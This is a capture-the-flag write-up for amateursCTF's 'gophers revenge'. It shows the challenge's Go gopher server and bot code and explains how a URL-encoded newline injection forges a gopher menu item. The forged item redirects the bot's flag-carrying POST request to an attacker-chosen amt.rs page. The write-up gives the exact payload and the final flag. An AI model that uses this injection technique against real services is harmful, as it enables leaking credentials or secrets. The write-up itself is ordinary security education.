# gophers revenge

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/76e7fabd-18bb-4ad4-a4d7-3c9d3cf57ae9)

main.go
```go
package main

import (
	"fmt"
	"log"
	"net/url"
	"strings"

	"git.mills.io/prologic/go-gopher"
)

func index(w gopher.ResponseWriter, r *gopher.Request) {
	w.WriteInfo("Welcome to the flag submitter!")
	w.WriteInfo("Please submit all your flags!")
	w.WriteItem(&gopher.Item{
		Type:        gopher.DIRECTORY,
		Selector:    "/submit/user",
		Description: "Submit flags here!",
	})
	w.WriteItem(&gopher.Item{
		Type:        gopher.FILE,
		Selector:    "URL:https://ctf.amateurs.team/",
		Description: "Get me more flags lackeys!!",
	})
	w.WriteItem(&gopher.Item{
		Type:        gopher.DIRECTORY,
		Selector:    "/",
		Description: "Nice gopher proxy",
		Host:        "gopher.floodgap.com",
		Port:        70,
	})
}

func submit(w gopher.ResponseWriter, r *gopher.Request) {
	name := strings.Split(r.Selector, "/")[2]
	undecoded, err := url.QueryUnescape(name)
	if err != nil {
		w.WriteError(err.Error())
	}
	w.WriteInfo(fmt.Sprintf("Hello %s", undecoded))
	w.WriteInfo("Please send a post request containing your flag at the server down below.")
	w.WriteItem(&gopher.Item{
		Type:        gopher.FILE,
		Selector:    "URL:http://amt.rs/gophers-catcher-not-in-scope",
		Description: "Submit here! (gopher doesn't have forms D:)",
		Host:        "error.host",
		Port:        1,
	})
}

func main() {
	mux := gopher.NewServeMux()

	mux.HandleFunc("/", index)
	mux.HandleFunc("/submit/", submit)

	log.Fatal(gopher.ListenAndServe("0.0.0.0:7000", mux))
}
```

bot.go
```go
package main

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"

	"git.mills.io/prologic/go-gopher"
	"golang.org/x/net/publicsuffix"
)

var flag = []byte{}

func randomString(length int) string {
	b := make([]byte, length+2)
	rand.Read(b)
	return fmt.Sprintf("%x", b)[2 : length+2]
}

func main() {
	content, err := os.ReadFile("flag.txt")
	if err != nil {
		log.Fatal(err)
	}
	flag = content

	http.HandleFunc("/submit", Submit)
	http.HandleFunc("/", Index)
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal(err)
	}
}

func Index(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "index.html")
}

func Submit(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	u, err := url.Parse(r.Form.Get("url"))
	if err != nil || u.Host != "amt.rs:31290" {
		w.Write([]byte("Invalid url"))
		return
	}

	w.Write([]byte(Visit(r.Form.Get("url"))))
}

func Visit(gopherURL string) string {
	fmt.Println(gopherURL)
	res, err := gopher.Get(gopherURL)
	if err != nil {
		return fmt.Sprintf("Something went wrong: %s", err.Error())
	}

	rawURL, _ := strings.CutPrefix(res.Dir.Items[2].Selector, "URL:")
	fmt.Println(rawURL)

	u, err := url.Parse(rawURL)

	etldpo, err2 := publicsuffix.EffectiveTLDPlusOne(u.Host)
	if err != nil || err2 != nil || etldpo != "amt.rs" {
		return "Invalid url"
	}

	resp, err := http.Post(u.String(), "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(fmt.Sprintf("username=%s&password=%s", randomString(20), flag))))

	if err != nil {
		return "Failed to make request"
	}

	cookies := resp.Cookies()
	token := ""
	for _, c := range cookies {
		if c.Name == "token" {
			token = c.Value
		}
	}

	if token != "" {
		return fmt.Sprintf("Thanks for sending in a flag! Use the following token once i get the gopher-catcher frontend setup: %s", token)
	} else {
		return "Something went wrong, my sever should have sent a cookie back but it didn't..."
	}
}
```

## solution

the original exploit in bot.go has been patched but there a different exploit we need to exploit

the exploit is found in main.go:

```go
func submit(w gopher.ResponseWriter, r *gopher.Request) {
	name := strings.Split(r.Selector, "/")[2]
	undecoded, err := url.QueryUnescape(name)
	if err != nil {
		w.WriteError(err.Error())
	}
	w.WriteInfo(fmt.Sprintf("Hello %s", undecoded))
	w.WriteInfo("Please send a post request containing your flag at the server down below.")
	w.WriteItem(&gopher.Item{
		Type:        gopher.FILE,
		Selector:    "URL:http://amt.rs/gophers-catcher-not-in-scope",
		Description: "Submit here! (gopher doesn't have forms D:)",
		Host:        "error.host",
		Port:        1,
	})
}
```

can you see it?

the first writeinfo is key, because it writes a string and so we can input any text there

in bot.go:

```go
	rawURL, _ := strings.CutPrefix(res.Dir.Items[2].Selector, "URL:")
	fmt.Println(rawURL)
```

it takes the 3rd item from the top (a,b,THIS ONE,d,etc) and takes the URL of it

to change the 3rd item, we need to input newlines into the first writeinfo string to shift other items down one

then, we need to fake a gopher item and give it a selector with a URL that redirects to where we want it to go

my payload was `gopher://amt.rs:31290/1/submit/?test=%0a0q%0a0wdwdq%09URL:https%3A%2F%2Fcps%2eamt%2Ers%2fregister.php%0a`

this is equivalent to `<newline>q<newline>0wdwdq<tab>URL:https://cps.amt.rs/register.php<newline>`

the way that it worked was that i saw the source for gopher protocol [here](https://git.mills.io/prologic/go-gopher/src/branch/master/gopher.go) and was able to construct a fake "itemtype" to match how the source would read it

the way that go converts "items" into "strings" is by using this function:

```go
// MarshalText serializes an Item into an array of bytes
func (i *Item) MarshalText() ([]byte, error) {
	b := []byte{}
	b = append(b, byte(i.Type))
	b = append(b, []byte(i.Description)...)
	b = append(b, TAB)
	b = append(b, []byte(i.Selector)...)
	b = append(b, TAB)
	b = append(b, []byte(i.Host)...)
	b = append(b, TAB)
	b = append(b, []byte(strconv.Itoa(i.Port))...)

	for _, s := range i.Extras {
		b = append(b, TAB)
		b = append(b, []byte(s)...)
	}

	b = append(b, []byte(CRLF)...)

	return b, nil
}
```

the list item format is `<type:1char><description:string><tab><URL:string><etc>`, so we can do `<0><wdwdq><tab><attacker url here><etc>`. the 0 is for type "item" btw

we have to redirect to an amt.rs site because of the following code in bot.go:

```go
	u, err := url.Parse(rawURL)

	etldpo, err2 := publicsuffix.EffectiveTLDPlusOne(u.Host)
	if err != nil || err2 != nil || etldpo != "amt.rs" {
		return "Invalid url"
	}
```

we cannot avoid this...

so we ended up changing the 3rd item to be a url to cps.amt.rs, which accepts a form of username,password which allows us to login and get the password

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/3bd593b3-c459-4620-9fe2-fbd3288af572)

in dev panel:

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/8842054e-6b10-46e5-b947-c8a1bb5ca7a2)

however, the flag is incorrect

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/bb074796-b957-4c4d-9945-c498b15617c4)

this is because the post request uses Sprintf and substitutes in the flag, and if the flag contains special chars, it messes everything up!

it took me waaaay too long (~5hrs) to realize that there was a space here and that the cps chall was not hiding something from me

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/34223b9d-90c9-455f-bd2d-28521ec0a0c6)


i ended up just solving the cps chall even though it was worth 0 points because i wanted to solve gopher, but it didnt give me the flag

i eventually realized that "+" looked like a "t", and also put a space char instead of a regular one because it is special char

the flag is `amateursCTF{ye5._+h1s_1s_g0pher_h3ll}`

this was, however, the hardest chall i solved and i am extremely proud of myself for solving it
